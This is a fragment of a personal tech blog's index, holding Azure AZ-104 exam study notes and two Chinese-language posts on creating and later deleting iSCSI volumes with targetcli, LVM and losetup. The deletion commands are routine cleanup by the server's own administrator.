policy\nThe Add-AzVhd cmdlet uploads on-premises virtual hard disks, in .vhd file format, to a blob storage account as fixed virtual hard disks.\nrecovery For physical servers - Storage Account - Azure Recovery Services Vault - Replication policy https://docs.microsoft.com/en-us/azure/site-recovery/physical-azure-disaster-recovery For Hyper-v server - Hyper-V site - Azure Recovery Services Vault - Replication policy https://docs.microsoft.com/en-nz/azure/site-recovery/hyper-v-prepare-on-premises-tutorial\nIf you make a change to the topology of your network and have Windows VPN clients, the VPN client package for Windows clients must be downloaded and installed again in order for the changes to be applied to the client\nTo configure an Azure internal load balancer as a listener for the availability group, you need to create a TCP health probe on port 1433, which is the default port for SQL Server.\nEach VM will have a minimum of 1 NIC, which can have one or more IPs associated to it(include public and privite ip)\nYou can only restore a VM to the original VM or a new Azure VM. Azure Backup is a cloud-based backup solution, and it doesn\u0026rsquo;t support restoring VMs to on-premise Windows devices.\nYou can set expiration policy only for Office 365 groups in Azure Active Directory (Azure AD).\nEach management group and subscription can only support one parent\nGroups can contain both registered and joined devices as members. Cloud device admin cannot add/join devices,user admin can add device/user/groups, Dynamic groups dont require manual intervention, it uses criteria to add or remove devices/users/groups only assigned groups you can add\nYou can\u0026rsquo;t delete a Recovery Services vault with any of the following dependencies: You can\u0026rsquo;t delete a vault that contains backup data. Once backup data is deleted, it will go into the soft deleted state. You can\u0026rsquo;t delete a vault that contains backup data in the soft deleted state.\nBefore you can delete a Recovery Service vault that contains protected virtual machines, you need to stop the backup of each backup item.\nIf you want to change the recovery service vault you need to disassociate the previous RSV and delete the backup data. To delete backup data, you need to stop the backup first.\nRecover Servies vault backup need resource in the same location with vault. to create a Vault to protect VMs, the Vault must be in the same Region as the VMs. VM,SQL,file share support be backuped by Recover Servies vault Blobs cannot be backup up to service vaults.\nAzure RBAC is the authorization system you use to manage access to Azure resources.\nAzure (RBAC) and Azure AD roles are independent. AD roles do not grant access to resources and Azure roles do not grant access to Azure AD.\nAzure AD Roles like Global Administrator dont provided access to resources. For that RBAC Roles need to be aplied to the users.\nAdvisor helps you optimize and reduce your overall Azure spend by identifying idle and underutilized resources. You can get cost recommendations from the Cost tab on the Advisor dashboard.\nYou can adjust the guest user settings, their access, who can invite them from \u0026ldquo;External collaboration settings\u0026rdquo;\nYou must use Windows Server Active Directory to update the identity, contact info, or job info for users whose source of authority is Windows Server Active. Usage location is an Azure property that can only be modified from Azure AD (for all users including Windows Server AD users synced via Azure AD Connect).\nYour account must have any one of the following Azure roles at the subscription scope to enable traffic analytics: owner, contributor, reader, or network contributor. https://docs.microsoft.com/en-us/azure/network-watcher/traffic-analytics#user-access-requirements\nboth Tags and Locks are available to Subscriptions, Resource Groups, and Resources.\nAdministrative units restrict permissions in a role to any portion of your organization that you define.\nOwner = Grants full access to manage all resources, including the ability to assign roles in Azure RBAC. Contributor = Grants full access to manage all resources, but does NOT allow you to assign roles in Azure RBAC. (you cannot add users or changes their rights) User Access Administrator = Lets you manage user access to Azure resources. Reader = View all resources, but does not allow you to make any changes. Security Admin = View and update permissions for Security Center. Same permissions as the Security Reader role and can also update the security policy and dismiss alerts and recommendations. Network Contributor = Lets you manage networks, but not access to them. (so you can add VNET, subnet, etc)\nBefore you enable Azure AD over SMB for Azure file shares, make sure you have completed the following prerequisites: \\1. Select or create an Azure AD tenant. \\2. To support authentication with Azure AD credentials, you must enable Azure AD Domain Services for your Azure AD tenant.\nyou can assign policy to Tenant Root Group,ManagementGroup1,Subscription1 and RG1 you can exclude policy from ManagementGroup1,Subscription1,RG11 and VM1\nBuilt-in AD roles can\u0026rsquo;t be cloned, but built-in subscription roles can be. Custom roles of either type can be cloned.\nGroup-based licensing currently does not support groups that contain other groups (nested groups). If you apply a license to a nested group, only the immediate first-level user members of the group have the licenses applied（license不支持嵌套group）\nNesting is currently not supported for groups that can be assigned to a role. （role不支持group嵌套）\nGeneral-purpose v2 (GPv2) accounts are storage accounts that support all of the latest features for blobs, files, queues, and tables. Blob storage accounts support all the same block blob features as GPv2, but are limited to supporting only block blobs. General-purpose v1 (GPv1) accounts provide access to all Azure Storage services, but may not have the latest features or the lowest per gigabyte pricing.\nYou may only tier your object storage data to hot, cool, or archive in Blob storage and General Purpose v2 (GPv2) accounts. General Purpose v1 (GPv1) accounts do not support tiering.\nGeo-redundant storage (GRS): Cross-regional replication to protect against region-wide unavailability. Locally-redundant storage (LRS): A simple, low-cost replication strategy. Data is replicated within a single storage scale unit. Read-access geo-redundant storage (RA-GRS): Cross-regional replication with read access to the replica. RA-GRS provides read-only access to the data in the secondary location, in addition to geo-replication across two regions, but is more expensive compared to GRS.\nA sync group contains one cloud endpoint, or Azure file share, and at least one server endpoint. Azure File Sync does not support more than one server endpoint from the same register server in the same Sync Group. Multiple server endpoints can exist on the same volume if their namespaces are not overlapping (for example, F:\\sync1 and F:\\sync2) and each endpoint is syncing to a unique sync group.\nServer Point synced quick, cloud point sync in 24 hours. cloud endpoint, and it is scanned by the detection job every 24 hours the on-premises servers the file is scanned and synced automatically after it\u0026rsquo;s being added.\nAzCopy is a command-line utility that you can use to copy blobs or files to or from a storage account.\nBoth Azure Active Directory (AD) and Shared Access Signature (SAS) token are supported for Blob storage. Only Shared Access Signature (SAS) token is supported for File storage.\nThe location and subscription where this Log Analytics workspace can be created is independent of the location and subscription where your vaults exist. vault和log analytics workspace不按照location和subscription区分 Storage Account must be in the same Region as the Recovery Services Vault.\nPremium file shares are hosted in a special purpose storage account kind, called a FileStorage account. The archive tier supports only LRS, GRS, and RA-GRS.\nServer Message Block (SMB) is used to connect to an Azure file share over the internet. The SMB protocol requires TCP port 445 to be open. Incorrect Answers: Port 80 is required for HTTP to a web server Port 443 is required for HTTPS to a web server Port 3389 is required for Remote desktop protocol (RDP) connections\nWhile a blob is in archive storage, the blob data is offline and can\u0026rsquo;t be read or modified. To read or download a blob in archive, you must first rehydrate it to an online tier.\nbackup VM1 and make sure backup data are stored across three availability zones in the primary region. Create Recovery Services Vault, Set Replication Policy to ZRS (because of the requirement for having in three separate zones) For VM1, create a backup policy\nAzure storage encryption supports RSA and RSA-HSM keys of sizes 2048, 3072 and 4096\nStorage account policy: Maximum number of Stored access policies is 5 Maximum number of Immutable blob storage is 2\nLifecycle management policies are supported for block blobs and append blobs in general-purpose v2, premium block blob, and Blob Storage accounts. Only storage accounts that are configured for LRS, GRS, or RA-GRS support moving blobs to the archive tier. The archive tier isn\u0026rsquo;t supported for ZRS, GZRS, or RA-GZRS accounts.(No Z)\nAccording to documentation only Premium file shares (FileStorage), LRS/ZRS are supported for SMB.\nAzure Blob Storage provides containers for storing blobs and queues for storing messages. Both containers and queues support conditions when assigning RBAC roles to specific resources within the storage account, allowing for more granular access control based on certain conditions.\nIf you want to select an existing virtual network, make sure it\u0026rsquo;s in the same location and Azure subscription as your Kubernetes cluster. VNet should be same location with AKS.\nWe cannot just move a virtual machine between networks. What we need to do is identify the disk used by the VM, delete the VM itself while retaining the disk, and recreate the VM in the target virtual network and then attach the original disk to it.\nWeb App can only created and identified in App Service plan in same region and resource group.\nTo install kubectl locally, use the az aks install-cli command.\nUse Azure Automation State Configuration to manage the ongoing consistency of the virtual machine configurations steps Step 1: Create and upload a configuration to Azure Automation Step 2: Compile a configuration into a node configuration Step 3: Register a VM to be managed by State Configuration Step 4: Specify configuration mode settings Step 5: Assign a node configuration to a managed node Step 6: Check the compliance status of a managed node\nAnswer in exam 1: Upload a configuration to Azure Automation State Configuration 2: Compile a configuration into a node configuration 3: Check the compliance status of the node.\nWhen you redeploy a VM, it moves the VM to a new node within the Azure infrastructure and then powers it back on, retaining all your configuration options and associated resources. 当Azure 维护导致VM需要shutdown时，使用该方式切换\nTo migrate a VM from a VNET to another VNET. The only option is to delete the VM and redeploy it using a new NIC and NIC connected to VNET2.\nWhile resizing the VM it must be in a stopped state.\nrecord all the successful and failed connection attempts to VM1. 1.Create a VM with a network security group 2.Enable Network Watcher and register the Microsoft.Insights provider 3.Enable a traffic flow log for an NSG, using Network Watcher\u0026rsquo;s NSG flow log capability 4.Download logged data 5.View logged data\nScaleSetVM orchestration mode: Virtual machine instances added to the scale set are based on the scale set configuration model. The virtual machine instance lifecycle - creation, update, deletion - is managed by the scale set. It the current default VMSS behavior. (Scale set VMs are created in a single shot). VM (virtual machines) orchestration mode: Virtual machines created outside of the scale set can be explicitly added to the scale set. The orchestration mode VM will only create an empty VMSS without any instances, and you will have to manually add new VMs into it by specifying the VMSS ID during the creation of the VM. (Separately VMs are created and added to scale set later)\nRecover Servies vault backup need resource in the same location with vault. to create a Vault to protect VMs, the Vault must be in the same Region as the VMs.\nYou can assign an NSG to the subnet of the virtual network in the same region\nBy default, Azure virtual machines can communicate only with other virtual machines that are connected to the same virtual network. If you want a virtual machine to communicate with other virtual machines that are connected to other virtual networks, you must configure network peering.\nYou can use a network security group (NSG) to be assigned to a network interface. NSGs can be associated with subnets or individual virtual machine instances within that subnet. When an NSG is associated with a subnet, the access control list (ACL) rules apply to all virtual machine instances of that subnet.\nApplication gateway allows you to configure load-balanced virtual machines on a private IP address and provide a web app firewall to block any SQL injection, header, and cross-site scripting XSS attacks. An internal load balancer cannot provide load balancing on a public front. A network security group (NSG) is only used to open ports on virtual machines. A public load balancer does not provide web app firewall capabilities to block attacks.\nAzure Application Gateway is a web traffic load balancer that operates at Layer 7 of the OSI model. Application Gateway can make routing decisions based on additional attributes of an HTTP request, such as the URI path or host headers.\nYou can detach a disk from a running virtual machine (hot removal).\nAzure Spot instances allow you to provision virtual machines at a reduced cost, but these virtual machines can be stopped by Azure when Azure needs the capacity for other pay-as-you-go workloads, or when the price of the spot instance exceeds the maximum price that you have set. These virtual machines are good for dev, testing, or for workloads that do not require any specific SLA.\nOnly zone-redundant replication (ZRS) supports StorageV2, FileStorage, and BlockBlobStorage accounts. Live migration is not supported for read-access geo-redundant storage (RA-GRS) and only standard storage accounts can be used.\nFor accessing the file share, port 445 must be open. Port 5671 is used to send health information to Azure AD.\nBy default, backups of virtual machines are kept for 30 days.\nA maximum of one SMS message can be sent every five minutes. Therefore, a maximum of 12 messages will be sent per hour.\nYour VMs should use managed disks if you want to move them to an Availability Zone by using Site Recovery\nBasic Azure Load Balancer supports deployment in a single availability zone. Basic Azure Load Balancer supports only Basic SKU public IP. Azure Standard Load Balancer is zone-redundant, but has a higher cost.\nYou can use delete locks to block the deletion of virtual machines, subscriptions, and resource groups. You cannot use delete locks on management groups or storage account data.\nCommand in SecurityEvent table in Azure Monitor. Summarize is used to group records from one or more columns of data. Where is used to filter the rows. Project is used to rename and select columns. Extend is used to add columns.\nYou can use the Log Analytics agent for Linux as part of a solution to collect JSON output from the Linux virtual machines.\nThe Azure Custom Script Extension is used for post-deployment configuration, software installation, or any other configuration or management task.\nDesired State Configuration (DSC) is a management platform that you can use to manage an IT and development infrastructure with configuration as code.\nThe Azure VMAccess extension acts as a KVM switch that allows you to access the console to reset access to Linux or perform disk-level maintenance.\nA lifecycle management rule can be used to move or delete blobs automatically. The rule can be based on the time the blob was last modified or the time the blob was last accessed (read or write). To perform an action based on the access time, access tracking must be enabled. This can incur additional storage costs.\nAdd-AzVhd: Uploads an on-premises VHD to Azure New-AzVM: Used to create a new virtual machine New-AzDisk: Used to create a managed disk New-AzDataShare: Used to create an Azure data share\nVersioning must be enabled for the source and target. An object type container is needed to replicate the images. You must create a StandardV2 storage account. File shares are not needed, and queues are unsupported for replication.\nAzure Network Watcher is a regional service that allows you to monitor and diagnose conditions at a network scenario level in, to, and from Azure. When you create or update a virtual network in a subscription, Network Watcher will be enabled automatically in the virtual network\u0026rsquo;s region. There is no impact on resources or associated charges for automatically enabling Network Watcher.\nYou can use API server authorized IP ranges if you want to maintain a public endpoint for the API server while restricting access to a set of trusted IP ranges. You can use a private cluster if you want to limit the API server to be accessible only from within your virtual network.\nObject replication can be used to replicate blobs between storage accounts. Before configuring object replication, you must enable blob versioning for both storage accounts, and you must enable the change feed for the source account.\nData pinned on a shared dashboard can only be displayed for a maximum of 14 days.\nBy default, backups of virtual machines are kept for 30 days.\nA timed-based retention policy or legal hold policies can be applied to block deletion. Immutability policies can be scoped to a blob version or to a container.\nSMS: No more than 1 SMS every 5 minutes. ✑ Voice: No more than 1 Voice call every 5 minutes. ✑ Email: No more than 100 emails in an hour. ✑ Other actions are not rate limited.\nTo create a vault to protect virtual machines, the vault must be in the same region as the virtual machines\nUse the az aks command and the Azure portal to configure cluster autoscaler for AKS1.\nThe Linux Diagnostic Extension should be used which downloads the Diagnostic Extension (LAD) agent on Linux server.\nthe DNS port 53\no deploy a YAML file, the command is: kubectl apply -f \u0026lt;file_name\u0026gt;.yaml\nThe virtual machine you attach a network interface to and the virtual network you connect it to must exist in the same location,\nYou can target your deployment to a resource group, subscription, management group, or tenant. Depending on the scope of the deployment, you use different commands. To deploy to a resource group, use New-AzResourceGroupDeployment. To deploy to a tenant, use New-AzTenantDeployment. To deploy to a subscription, use New-AzSubscriptionDeployment which is an alias of the New-AzDeployment cmdlet. To deploy to a management group, use New-AzManagementGroupDeployment.\nApp Service can back up the following information to an Azure storage account and container that you have configured your app to use App configuration - File content - Database connected to your app -\nAzure Web Application Firewall (WAF) on Azure Application Gateway provides centralized protection of your web applications from common exploits and vulnerabilities. Web applications are increasingly targeted by malicious attacks that exploit commonly known vulnerabilities.\nA public and a private IP address can be assigned to a single network interface.\nThe virtual machines are registered (added) to the private zone as A records pointing to their private IP addresses.\nBefore creating a network interface, you must have an existing virtual network in the same location and subscription you create a network interface in.\nWith Azure CNI, every pod gets an IP address from the subnet and can be accessed directly. These IP addresses must be unique across your network space.\nThe connection monitor capability monitors communication at a regular interval and informs you of reachability, latency, and network topology changes between the VM and the endpoint\nload balancers with VMs The Basic tier load balancer is quite restrictive. A load balancer is restricted to a single availability set, virtual machine scale set, or a single machine. The Standard tier load balancer can span any virtual machine in a single virtual network, including blends of scale sets, availability sets, and machines.\nAzure DNS provides automatic registration of virtual machines from a single virtual network that\u0026rsquo;s linked to a private zone as a registration virtual network.\nA Site-to-Site (S2S) VPN gateway connection is used to connect your on-premises network to an Azure virtual network over an IPsec/IKE (IKEv1 or IKEv2) VPN tunnel. IKEv2 supports 10 S2S connections, while IKEv1 only supports 1.\nNetwork Watcher variable packet capture allows you to create packet capture sessions to track traffic to and from a virtual machine. Packet capture helps to diagnose network anomalies both reactively and proactively.\nVM apply azure firewall shoule use same location with Azure firewall A Basic Load Balancer supports virtual machines in a single availability set or virtual machine scale set\n","permalink":"https://rendoumi.com/posts/20230913-az-104/","summary":"\u003cp\u003e在今年微软的挑战中拿了两张免费考卷，一张是115$，怕浪费啊，就分别考了AZ-104和AZ-305，基本上你104能过，305就没有问题，az-104挺多知识点的，最讨厌的是步骤题，不知道死记那些步骤有何意思，把104的知识要点分列如下：\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003eResourceGroup的 Tag不会被resource继承，新建的policy只针对新添加和更新的resource生效，对没有修改的resource不生效，另外需要关注policy的defination是只针对resource还是包括resource groups\nAdds the specified tag and value when any resource missing this tag is created or updated. Existing resources can be remediated by triggering a remediation task. If the tag exists with a different value it will not be changed. Does not modify tags on resource groups.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eResize Availability Set下的VM， 需要停止Availability Set下所有的VM\nIf the VM you wish to resize is part of an availability set, then you must stop all VMs in the availability set before changing the size of any VM in the availability set.\u003c/p\u003e","title":"Azure认证az-104的考点"},{"content":"上一篇我们用losetup建了一个iscsi卷，现在空间不够了，需要释放掉之前建立的iscsi-volumes的20T空间。\n首先去isci卷的宿主机查看一下\ntargetcli ls / 开始删除，先删除backstores，然后是iscsi，lv，vg，pv:\n# targetcli /backstores/block delete vg-targetd:pvc-harbor\rDeleted storage object vg-targetd:pvc-harbor.\r# targetcli /backstores/block delete vg-targetd:pvc-vis-18-31-48\rDeleted storage object vg-targetd:pvc-vis-18-31-48.\r# targetcli /backstores/block delete vg-targetd:pvc-vis-18-31-49\rDeleted storage object vg-targetd:pvc-vis-18-31-49.\r# targetcli /iscsi delete iqn.2020-07.com.ddky:renhe-18-30-18\rDeleted Target iqn.2020-07.com.ddky:renhe-18-30-18.\r# targetcli /iscsi delete iqn.2020-10.com.ddky:vis-18-31-48\rDeleted Target iqn.2020-10.com.ddky:vis-18-31-48.\r# targetcli /iscsi delete iqn.2020-10.com.ddky:vis-18-31-49\rDeleted Target iqn.2020-10.com.ddky:vis-18-31-49.\r# lvs\rLV VG Attr LSize Pool Origin Data% Meta% Move Log Cpy%Sync Convert\rpvc-harbor vg-targetd -wi-a----- 200.00g pvc-vis-18-31-48 vg-targetd -wi-a----- 80.00g pvc-vis-18-31-49 vg-targetd -wi-a----- 80.00g # lvremove /dev/vg-targetd/pvc-harbor\rDo you really want to remove active logical volume vg-targetd/pvc-harbor? [y/n]: y\rLogical volume \u0026#34;pvc-harbor\u0026#34; successfully removed\r# lvremove /dev/vg-targetd/pvc-vis-18-31-48\rDo you really want to remove active logical volume vg-targetd/pvc-vis-18-31-48? [y/n]: y\rLogical volume \u0026#34;pvc-vis-18-31-48\u0026#34; successfully removed\r# lvremove /dev/vg-targetd/pvc-vis-18-31-49\rDo you really want to remove active logical volume vg-targetd/pvc-vis-18-31-49? [y/n]: y\rLogical volume \u0026#34;pvc-vis-18-31-49\u0026#34; successfully removed\r# vgremove vg-targetd\rVolume group \u0026#34;vg-targetd\u0026#34; successfully removed\r# lvs\r# vgs\r# pvs\rPV VG Fmt Attr PSize PFree /dev/loop0 lvm2 --- 19.53t 19.53t\r# pvremove /dev/loop0\rLabels on physical volume \u0026#34;/dev/loop0\u0026#34; successfully wiped. 一整套下来，基本都干净了。\n最后清理文件，注意如果不停掉targetd服务，是无法remove loop设备的\nsystemctl stop targetd\rlosetup -a\rlosetup -d /dev/loop0\rlosetup -a\rcd /glusterfs/iscsi-volumes\rrm -f k8s-iscsi-volumes.img 这样就多了20T磁盘空间。\n","permalink":"https://rendoumi.com/posts/20230905-iscsi_volume_release/","summary":"\u003cp\u003e上一篇我们用losetup建了一个iscsi卷，现在空间不够了，需要释放掉之前建立的iscsi-volumes的20T空间。\u003c/p\u003e\n\u003cp\u003e首先去isci卷的宿主机查看一下\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003etargetcli ls /\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/posts/20230905-iscsi_volume_release/2021-06-14_214935.png\"\u003e\u003c/p\u003e\n\u003cp\u003e开始删除，先删除backstores，然后是iscsi，lv，vg，pv:\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e# targetcli /backstores/block delete vg-targetd:pvc-harbor\r\nDeleted storage object vg-targetd:pvc-harbor.\r\n# targetcli /backstores/block delete vg-targetd:pvc-vis-18-31-48\r\nDeleted storage object vg-targetd:pvc-vis-18-31-48.\r\n# targetcli /backstores/block delete vg-targetd:pvc-vis-18-31-49\r\nDeleted storage object vg-targetd:pvc-vis-18-31-49.\r\n\r\n# targetcli /iscsi delete iqn.2020-07.com.ddky:renhe-18-30-18\r\nDeleted Target iqn.2020-07.com.ddky:renhe-18-30-18.\r\n# targetcli /iscsi delete iqn.2020-10.com.ddky:vis-18-31-48\r\nDeleted Target iqn.2020-10.com.ddky:vis-18-31-48.\r\n# targetcli /iscsi delete iqn.2020-10.com.ddky:vis-18-31-49\r\nDeleted Target iqn.2020-10.com.ddky:vis-18-31-49.\r\n\r\n# lvs\r\n  LV               VG         Attr       LSize   Pool Origin Data%  Meta%  Move Log Cpy%Sync Convert\r\n  pvc-harbor       vg-targetd -wi-a----- 200.00g                                                    \r\n  pvc-vis-18-31-48 vg-targetd -wi-a-----  80.00g                                                    \r\n  pvc-vis-18-31-49 vg-targetd -wi-a-----  80.00g                                                    \r\n# lvremove /dev/vg-targetd/pvc-harbor\r\nDo you really want to remove active logical volume vg-targetd/pvc-harbor? [y/n]: y\r\n  Logical volume \u0026#34;pvc-harbor\u0026#34; successfully removed\r\n# lvremove /dev/vg-targetd/pvc-vis-18-31-48\r\nDo you really want to remove active logical volume vg-targetd/pvc-vis-18-31-48? [y/n]: y\r\n  Logical volume \u0026#34;pvc-vis-18-31-48\u0026#34; successfully removed\r\n# lvremove /dev/vg-targetd/pvc-vis-18-31-49\r\nDo you really want to remove active logical volume vg-targetd/pvc-vis-18-31-49? [y/n]: y\r\n  Logical volume \u0026#34;pvc-vis-18-31-49\u0026#34; successfully removed\r\n\r\n# vgremove vg-targetd\r\n  Volume group \u0026#34;vg-targetd\u0026#34; successfully removed\r\n# lvs\r\n# vgs\r\n# pvs\r\n  PV         VG Fmt  Attr PSize  PFree \r\n  /dev/loop0    lvm2 ---  19.53t 19.53t\r\n\r\n# pvremove /dev/loop0\r\n  Labels on physical volume \u0026#34;/dev/loop0\u0026#34; successfully wiped.\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e一整套下来，基本都干净了。\u003c/p\u003e","title":"iscsi卷的释放"},{"content":"如果机器的磁盘空间不够，可以用iscsi把服务器172.18.30.18上面划出一片空间，远程挂上来用。\n注意，服务器用losetup的这种做法是为了将来k8s也可以这样用动态iscsi卷\n服务器端安装 登录172.18.30.18\n安装：\nyum install -y targetcli targetd` 用文件来虚拟LVM卷：\ncd /glusterfs/iscsi-volumes/ 生成20TB文件 dd if=/dev/zero of=k8s-iscsi-volumes.img bs=1G count=20000 export LOOP=`losetup -f` losetup $LOOP k8s-iscsi-volumes.img vgcreate vg-targetd $LOOP 修改targetd.yaml:\nvi /etc/target/targetd.yaml password: xxxxxxxx # defaults below; uncomment and edit # if using a thin pool, use \u0026lt;volume group name\u0026gt;/\u0026lt;thin pool name\u0026gt; # e.g vg-targetd/pool pool_name: vg-targetd user: admin ssl: false target_name: iqn.2020-04.com.ddky:renhe-18-30-18 注意，这个文件生成后，就不需要改动了，如果以后target_name变了，也不用管，也不需要重启targetd\n启动服务：\nsystemctl enable --now target systemctl enable --now targetd 运行一下命令，看看显示结果 pvdisplay vgdisplay lvdisplay targetcli ls /\n注意：lvdisplay结果和targetcli ls /结果都是空\n如果有定义好的iscsi，3260端口才会开放。所以现在只开启了18700的targetd，3260未开放中。\n如果以后定义好了，那么显示结果如下图：\n那如果想要彻底删除某个已经存在的iscsi卷，三步曲：\n首先删掉block设备 targetcli /backstores/block delete vg-targetd:pvc-harbor 然后删除iscsi targetcli /iscsi delete iqn.2020-07.com.ddky:renhe-18-30-18 最后删除lv lvremove /dev/vg-targetd/pvc-harbor 建立新的卷的方法：\n建立新的lv pvc-harbor, 200G lvcreate -L 200G -n pvc-harbor vg-targetd 建立新的block设备 targetcli /backstores/block create vg-targetd:pvc-harbor /dev/vg-targetd/pvc-harbor 建立新的iqn targetcli /iscsi create iqn.2020-07.com.ddky:renhe-18-30-18 建立新的lun，portal会自动建立，3260端口会开放 targetcli /iscsi/iqn.2020-07.com.ddky:renhe-18-30-18/tpg1/luns create /backstores/block/vg-targetd:pvc-harbor 建立新的acls targetcli /iscsi/iqn.2020-07.com.ddky:renhe-18-30-18/tpg1/acls create iqn.2020-07.com.ddky:harbor-18-31-28 设置acls的鉴权 targetcli /iscsi/iqn.2020-07.com.ddky:renhe-18-30-18/tpg1/acls/iqn.2020-07.com.ddky:harbor-18-31-28 set attribute authentication=0 targetcli /iscsi/iqn.2020-07.com.ddky:renhe-18-30-18/tpg1/acls/iqn.2020-07.com.ddky:harbor-18-31-28 set auth userid=admin password=nishiwode 如果lun只对srv2开放，不对srv1开放，方法如下： /\u0026gt; iscsi/iqn.2003-01.local.rhce.ipa:target/tpg1/acls create iqn.1994-05.com.redhat:srv1 add_mapped_luns=false /\u0026gt; iscsi/iqn.2003-01.local.rhce.ipa:target/tpg1/acls create iqn.1994-05.com.redhat:srv2 ok，如上，服务器端就设置好了\n这里没有重启，只是运行了targetcli saveconfig 实测，真的不需要重启target，systemctl restart target\n客户端安装 安装iscsi客户端\nyum install iscsi-initiator-utils -y 修改initiatorname.iscsi，也就是自己的iqn号\nvi /etc/iscsi/initiatorname.iscsi InitiatorName=iqn.2020-07.com.ddky:harbor-18-31-28 修改iscsid.conf\nvi /etc/iscsi/iscsid.conf，增加3行 node.session.auth.authmethod = CHAP node.session.auth.username = admin node.session.auth.password = xxxxxxxx 重启服务：\nsystemctl restart iscsid 发现一下对端：\n# iscsiadm -m discovery -t sendtargets -p 172.18.30.18:3260 172.18.30.18:3260,1 iqn.2020-07.com.ddky:renhe-18-30-18 登录ISCSI：\n# iscsiadm -m node -T iqn.2020-07.com.ddky:renhe-18-30-18 -p 172.18.30.18:3260 --login Logging in to [iface: default, target: iqn.2020-07.com.ddky:renhe-18-30-18, portal: 172.18.30.18,3260] (multiple) Login to [iface: default, target: iqn.2020-07.com.ddky:renhe-18-30-18, portal: 172.18.30.18,3260] successful. 查看session:\niscsiadm -m session -P3 | less 系统中会多出一块盘，/dev/sda\n直接格式化，不要分区，mkfs.xfs /dev/sda\n查出uuid\nblkid /dev/sda /dev/sda: UUID=\u0026#34;58024012-aa03-4091-a11a-0bb74beeed5a\u0026#34; TYPE=\u0026#34;xfs\u0026#34; 编辑/etc/fstab\nvi /etc/fstab UUID=58024012-aa03-4091-a11a-0bb74beeed5a /mnt xfs _netdev 0 0 Ok, 搞定。\n增加给vis-18-31-48增加pxe的sanboot启动硬盘的方法：\n#划个lvc，用的是vg-targetd的20T中的80G lvcreate -L 80G -n pvc-vis-18-31-48 vg-targetd #建立block块设备 targetcli /backstores/block create vg-targetd:pvc-vis-18-31-48 /dev/vg-targetd/pvc-vis-18-31-48 #建立30.18上的iscsi服务端，似乎用renhe-18-30-18比较好，但是不好区分多个卷 targetcli /iscsi create iqn.2020-10.com.ddky:vis-18-31-48 #建立luns，会自动建立portal targetcli /iscsi/iqn.2020-10.com.ddky:vis-18-31-48/tpg1/luns create /backstores/block/vg-targetd:pvc-vis-18-31-48 #建立客户端的iscsi，不加认证 targetcli /iscsi/iqn.2020-10.com.ddky:vis-18-31-48/tpg1/acls create iqn.2020-10.com.ddky:vis-18-31-48 这样客户端用 iqn.2020-10.com.ddky:vis-13-31-48 就可以mount出来\n","permalink":"https://rendoumi.com/posts/20230801-iscsi_volume/","summary":"\u003cp\u003e如果机器的磁盘空间不够，可以用iscsi把服务器172.18.30.18上面划出一片空间，远程挂上来用。\u003c/p\u003e\n\u003cp\u003e注意，服务器用losetup的这种做法是为了将来k8s也可以这样用动态iscsi卷\u003c/p\u003e\n\u003ch1 id=\"服务器端安装\"\u003e服务器端安装\u003c/h1\u003e\n\u003cp\u003e登录172.18.30.18\u003c/p\u003e\n\u003cp\u003e安装：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eyum install -y targetcli targetd\u003cspan class=\"sb\"\u003e`\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e用文件来虚拟LVM卷：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003ecd\u003c/span\u003e /glusterfs/iscsi-volumes/\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e生成20TB文件\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edd \u003cspan class=\"k\"\u003eif\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e/dev/zero \u003cspan class=\"nv\"\u003eof\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003ek8s-iscsi-volumes.img \u003cspan class=\"nv\"\u003ebs\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e1G \u003cspan class=\"nv\"\u003ecount\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e20000\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eexport\u003c/span\u003e \u003cspan class=\"nv\"\u003eLOOP\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"sb\"\u003e`\u003c/span\u003elosetup -f\u003cspan class=\"sb\"\u003e`\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003elosetup \u003cspan class=\"nv\"\u003e$LOOP\u003c/span\u003e k8s-iscsi-volumes.img\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evgcreate vg-targetd \u003cspan class=\"nv\"\u003e$LOOP\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e修改targetd.yaml:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evi /etc/target/targetd.yaml\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003epassword: xxxxxxxx\n\u003c/span\u003e\u003c/span\u003e\u003cspan 